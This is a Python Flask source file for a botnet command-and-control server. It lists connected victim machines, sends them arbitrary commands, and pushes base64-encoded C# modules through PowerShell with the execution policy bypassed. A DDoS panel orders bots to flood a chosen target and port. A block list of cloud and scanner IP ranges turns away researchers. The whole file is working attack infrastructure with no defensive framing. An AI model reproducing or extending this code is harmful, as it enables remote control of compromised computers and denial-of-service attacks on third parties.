import argparse
import threading
import socket
import uuid
import time
import os
import base64
import json
import re
import secrets
import logging
from logging.handlers import RotatingFileHandler
from datetime import datetime, timedelta
from functools import wraps

from flask import (
    Flask, jsonify, render_template, request,
    abort, redirect, url_for, session, flash, Response, g
)

# ——————— BOT BLOCKER STATE ———————
SETTINGS_FILE = 'blocked.json'
DEFAULT_BLOCK = [
    # AWS scanners
    "3.130.96.", "3.131.215.38", "3.132.23.201",
    "3.137.73.221", "3.143.33.63", "3.149.59.26",
    # Azure probes
    "20.12.240.188", "20.64.105.250", "20.163.3.234",
    # DigitalOcean / Droplets
    "167.94.145.", "167.94.138.180", "167.94.146.59",
    "167.94.145.111",
    # Linode & similar
    "45.156.130.",
    # Hetzner cloud scanners
    "185.247.137.", "87.236.176.",
    # Other cloud/VPN hosts
    "206.168.34.68", "206.168.34.87",
    "47.237.163.151",
    "152.32.140.206", "152.32.234.184",
    "162.142.125.", "188.92.79.113",
    "199.45.154.", "44.247.74.215", "64.62.156.222",
    # Asia-centric mass scans
    "36.106.166.197", "36.106.167.216", "36.106.167.79",
    "111.113.89.74", "112.94.253.30", "120.0.52.21",
    "123.245.84.161", "171.117.226.73", "180.95.238.218",
    "182.138.158.188"
]
blocked_ips = []

# ——————— APP SETUP ———————
app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=False,
    SESSION_COOKIE_SAMESITE='Lax',
)

# ——————— LOGGING ———————
logger = logging.getLogger('c2_logger')
logger.setLevel(logging.DEBUG)
fh = RotatingFileHandler('activity.log', maxBytes=1_000_000, backupCount=3)
fh.setFormatter(logging.Formatter('%(asctime)s | %(levelname)-8s | %(message)s'))
logger.addHandler(fh)
ch = logging.StreamHandler()
ch.setFormatter(logging.Formatter('%(asctime)s | %(levelname)-8s | %(message)s'))
logger.addHandler(ch)

# ——————— REQUEST LOGGING ———————
@app.before_request
def before_request():
    # ——— bot-blocker: drop unwanted clients ———
    ip = request.remote_addr
    if any(ip == b or ip.startswith(b) for b in blocked_ips):
        logger.warning(f"Blocked bot request {ip} to {request.path}")
        abort(403)

    g.start = time.time()
    if request.method != 'GET':
        logger.info(f"HTTP {request.method} {request.path} from {ip}")

@app.after_request
def after_request(resp):
    if request.method != 'GET' and hasattr(g, 'start'):
        duration = time.time() - g.start
        logger.info(f"--> {resp.status_code} ({duration:.3f}s)")
    return resp

# ——————— CREDENTIALS ———————
USERNAME = os.getenv('DASH_USER', 'admin')
PASSWORD = os.getenv('DASH_PASS', 'secret')

# ——————— GLOBAL STATE ———————
devices     = {}    # cid -> { sock, addr, connected_at, buffer, last_seen, bytes_received }
modules     = {}    # name -> { path, meta }
ddos_tasks  = []    # each: {id, client_id, protocol, target, port, ends, status}
registry_lock = threading.Lock()
MODULES_DIR = 'modules'


def load_blocked():
    global blocked_ips
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'r') as f:
            blocked_ips = json.load(f)
    else:
        # seed with defaults on first run
        blocked_ips = DEFAULT_BLOCK.copy()
        save_blocked()

def save_blocked():
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(blocked_ips, f)

load_blocked()

# ——————— AUTH DECORATOR ———————
def login_required(f):
    @wraps(f)
    def wrapped(*a, **kw):
        if not session.get('logged_in'):
            logger.warning(f"Unauthorized to {request.path}")
            return redirect(url_for('login', next=request.path))
        return f(*a, **kw)
    return wrapped

# ——————— AUTH ROUTES ———————
@app.route('/login', methods=('GET','POST'))
def login():
    ip = request.remote_addr
    if request.method=='POST':
        u = request.form['username']
        p = request.form['password']
        logger.info(f"LOGIN ATTEMPT {ip} user={u!r}")
        if u==USERNAME and p==PASSWORD:
            session.clear()
            session['logged_in']=True
            logger.info(f"LOGIN SUCCESS {ip} user={u!r}")
            return redirect(request.args.get('next') or url_for('index'))
        flash('Invalid credentials','danger')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    logger.info(f"LOGOUT {request.remote_addr}")
    flash('Logged out','info')
    return redirect(url_for('login'))

@app.route('/register', methods=('GET','POST'))
@login_required  # or remove if you want it publicly accessible
def register():
    if request.method == 'POST':
        flash('Registration is not implemented yet.', 'warning')
    return render_template('register.html')

# ——————— MODULE LOADING ———————
def load_modules():
    modules.clear()
    for fn in os.listdir(MODULES_DIR):
        if fn.lower().endswith('.cs'):
            path = os.path.join(MODULES_DIR, fn)
            raw  = open(path,'r', encoding='utf-8', errors='ignore').read()
            m    = re.search(r'/\*\s*(\{.*?\})\s*\*/', raw, re.S)
            meta = json.loads(m.group(1)) if m else {}
            name = meta.get('name', os.path.splitext(fn)[0])
            modules[name] = {'path': path, 'meta': meta}
    logger.info("Modules loaded: " + ", ".join(modules.keys()))

load_modules()
# (optional hot-reload every 60s)
threading.Thread(target=lambda: (time.sleep(60), load_modules()), daemon=True).start()

# ——————— CLIENT LISTENER ———————
def listener(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(5)
    logger.info(f"Listening for clients on {host}:{port}")
    while True:
        conn, addr = sock.accept()
        client_ip = addr[0]
        # drop bots immediately
        if any(client_ip == b or client_ip.startswith(b) for b in blocked_ips):
            logger.info(f"Blocked bot connection from {addr}")
            conn.close()
            continue
        cid = uuid.uuid4().hex[:8]
        now = time.strftime("%Y-%m-%d %H:%M:%S")
        with registry_lock:
            devices[cid] = {
                'sock': conn,
                'addr': addr,
                'connected_at': now,
                'buffer': [],
                'last_seen': now,
                'bytes_received': 0
            }
        logger.info(f"New client {cid} from {addr}")
        threading.Thread(target=handle_client, args=(cid,conn), daemon=True).start()

def handle_client(cid, conn):
    """Receive lines and append to buffer."""
    try:
        with conn:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                text = data.decode(errors='ignore').rstrip()
                with registry_lock:
                    devices[cid]['buffer'].append(text)
                    devices[cid]['last_seen'] = time.strftime("%Y-%m-%d %H:%M:%S")
                    devices[cid]['bytes_received'] += len(data)
    except Exception as e:
        logger.error(f"{cid} handler error: {e}")
    finally:
        with registry_lock:
            devices.pop(cid, None)
        logger.info(f"Client {cid} disconnected")

# ——————— WEB ROUTES ———————
@app.route('/')
@login_required
def index():
    return render_template('index.html')

@app.route('/clients')
@login_required
def clients():
    with registry_lock:
        out = [
            {
                'id': cid,
                'addr': f"{info['addr'][0]}:{info['addr'][1]}",
                'connected_at': info['connected_at'],
                'last_seen': info.get('last_seen', info['connected_at']),
                'bytes_received': info.get('bytes_received', 0)
            }
            for cid, info in devices.items()
        ]
    return jsonify(out)  # :contentReference[oaicite:2]{index=2}

@app.route('/client/<cid>')
@login_required
def client_view(cid):
    if cid not in devices:
        abort(404)
    return render_template('client.html', client_id=cid)

@app.route('/modules')
@login_required
def list_modules():
    return jsonify([
        {
          'name': nm,
          'desc': info['meta'].get('desc',''),
          'author': info['meta'].get('author',''),
          'version': info['meta'].get('version',''),
          'args': info['meta'].get('args',[])
        }
        for nm,info in modules.items()
    ])

@app.route('/client/<cid>/module', methods=['POST'])
@login_required
def run_module(cid):
    data = request.json or {}
    mod  = data.get('module')
    args = data.get('args', [])
    if mod not in modules:
        abort(404)
    path = modules[mod]['path']
    payload = base64.b64encode(open(path,'rb').read()).decode()
    ps = (
      "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "
      f"$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{payload}'));"
      "Add-Type -TypeDefinition $code -Language CSharp "
      "-ReferencedAssemblies System.Windows.Forms,System.Drawing;"
      f"[Module]::Run(@({','.join(repr(a) for a in args)}))"
    )
    with registry_lock:
        devices[cid]['sock'].sendall(ps.encode()+b'\n')
    logger.info(f"Dispatched module {mod} → {cid}")  # :contentReference[oaicite:3]{index=3}
    return ('',204)

@app.route('/client/<cid>/cmd', methods=['POST'])
@login_required
def client_cmd(cid):
    cmd = request.json.get('cmd')
    if not cmd: abort(400)
    with registry_lock:
        devices[cid]['sock'].sendall(cmd.encode()+b'\n')
    return ('',204)

@app.route('/client/<cid>/stream')
@login_required
def stream(cid):
    def gen():
        idx = 0
        while True:
            time.sleep(0.5)
            with registry_lock:
                buf = devices.get(cid,{}).get('buffer',[])
            if idx < len(buf):
                for line in buf[idx:]:
                    yield f"data: {line}\n\n"
                idx = len(buf)
    return Response(gen(), mimetype='text/event-stream')

@app.route('/blocker', methods=('GET','POST'))
@login_required
def blocker():
    if request.method == 'POST':
        ip = request.form.get('ip','').strip()
        act = request.form.get('action')
        if act == 'add' and ip and ip not in blocked_ips:
            blocked_ips.append(ip)
            save_blocked()
            flash(f'Blocked {ip}', 'success')
        elif act == 'remove' and ip in blocked_ips:
            blocked_ips.remove(ip)
            save_blocked()
            flash(f'Unblocked {ip}', 'info')
    return render_template('blocker.html', blocked=blocked_ips)

# ——————— DDoS PANEL ———————
@app.route('/ddos')
@login_required
def ddos_panel():
    return render_template('ddos.html')

@app.route('/ddos/start', methods=['POST'])
@login_required
def start_ddos():
    data = request.json or {}
    cid      = data['client_id']
    proto    = data['protocol'].upper()
    target   = data['target']
    port     = int(data['port'])
    duration = int(data['duration'])
    pps      = int(data.get('pps',100))

    # inline dispatch just like run_module
    path = modules['ddos']['path']
    payload = base64.b64encode(open(path,'rb').read()).decode()
    ps = (
      "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "
      f"$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{payload}'));"
      "Add-Type -TypeDefinition $code -Language CSharp "
      "-ReferencedAssemblies System.Windows.Forms,System.Drawing;"
      f"[Module]::Run(@('{proto}','{target}','{port}','{duration}','{pps}'))"
    )
    with registry_lock:
        devices[cid]['sock'].sendall(ps.encode()+b'\n')

    # record task
    ends = datetime.utcnow() + timedelta(seconds=duration)
    task = {
      'id': uuid.uuid4().hex[:8],
      'client_id': cid,
      'protocol': proto,
      'target': target,
      'port': port,
      'ends': ends,
      'status': 'running'
    }
    with registry_lock:
        # GC tasks >1h old
        cutoff = datetime.utcnow() - timedelta(hours=1)
        ddos_tasks[:] = [t for t in ddos_tasks if t['ends']>cutoff]
        ddos_tasks.append(task)
    return ('',204)

@app.route('/ddos/tasks')
@login_required
def list_ddos_tasks():
    now = datetime.utcnow()
    out = []
    with registry_lock:
        for t in ddos_tasks:
            if t['status']=='running' and now>=t['ends']:
                t['status']='completed'
            out.append({
              'id':        t['id'],
              'client_id': t['client_id'],
              'protocol':  t['protocol'],
              'target':    t['target'],
              'port':      t['port'],
              'status':    t['status'],
              'remaining': max(0, int((t['ends']-now).total_seconds()))
            })
    return jsonify(out)

# ——————— MAIN ———————
if __name__=='__main__':
    p = argparse.ArgumentParser()
    p.add_argument('--listen-host', default='0.0.0.0')
    p.add_argument('--listen-port', type=int, required=True)
    p.add_argument('--web-port',    type=int, default=8000)
    args = p.parse_args()

    threading.Thread(
      target=listener,
      args=(args.listen_host, args.listen_port),
      daemon=True
    ).start()
    logger.info(f"Flask on 0.0.0.0:{args.web_port}")
    app.run(host='0.0.0.0', port=args.web_port, debug=False)
